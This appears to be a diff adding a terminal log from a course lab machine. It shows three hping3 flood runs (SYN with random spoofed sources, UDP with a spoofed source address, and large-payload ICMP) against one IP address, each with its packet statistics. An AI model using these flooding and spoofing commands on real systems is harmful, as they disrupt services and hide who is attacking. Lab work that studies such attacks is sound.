@@ -1,0 +1,23 @@
+root@COMP3134-Winter26:/var/www/html# sudo hping3 -S --rand-source -c 10000 -i u1 138.197.128.144
+HPING 138.197.128.144 (eth0 138.197.128.144): S set, 40 headers + 0 data bytes
+
+--- 138.197.128.144 hping statistic ---
+10000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
+
+-----
+
+root@COMP3134-Winter26:/var/www/html# hping3 --udp -a 1.2.3.4 -c 9000 -i u10000 138.197.128.144
+
+--- 138.197.128.144 hping statistic ---
+9000 packets transmitted, 9000 packets received, 0% packet loss
+round-trip min/avg/max = 0.1/1.9/1002.1 ms
+
+-----
+
+root@COMP3134-Winter26:/var/www/html# sudo hping3 --icmp -d 1000 -c 11000 -i u13333 138.197.128.144
+HPING 138.197.128.144 (eth0 138.197.128.144): icmp mode set, 28 headers + 1000 data bytes
+
+--- 138.197.128.144 hping statistic ---
+11000 packets transmitted, 0 packets received, 100% packet loss
+round-trip min/avg/max = 0.0/0.0/0.0 ms
